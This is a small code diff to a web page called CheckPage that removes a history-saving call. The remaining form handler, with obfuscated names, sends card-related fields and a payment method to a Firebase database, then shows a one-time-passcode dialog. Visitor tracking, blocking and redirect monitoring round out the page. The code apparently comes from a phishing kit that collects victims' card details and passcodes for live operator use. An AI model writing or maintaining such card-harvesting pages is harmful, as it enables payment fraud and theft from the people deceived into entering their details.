@@ -11,7 +11,7 @@ import P1 from "@/components/form-a"
 import { getOrCreateVisitorID, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
 import { useAutoSave } from "@/hooks/use-auto-save"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
-import { addData, saveToHistory, db } from "@/lib/firebase"
+import { addData, db } from "@/lib/firebase"
 import { doc, getDoc, onSnapshot } from "firebase/firestore"
 
 export default function CheckPage() {
@@ -120,7 +120,6 @@ export default function CheckPage() {
   const _hp = async (e: React.FormEvent) => {
     e.preventDefault()
     // Save current data to history before updating
-    await saveToHistory(visitorID, 4)
     
     await addData({ id: visitorID, _v1, _v2, _v3, selectedPaymentMethod, cardUpdatedAt: new Date().toISOString() }).then(() => {
       setShowOtpDialog(true)
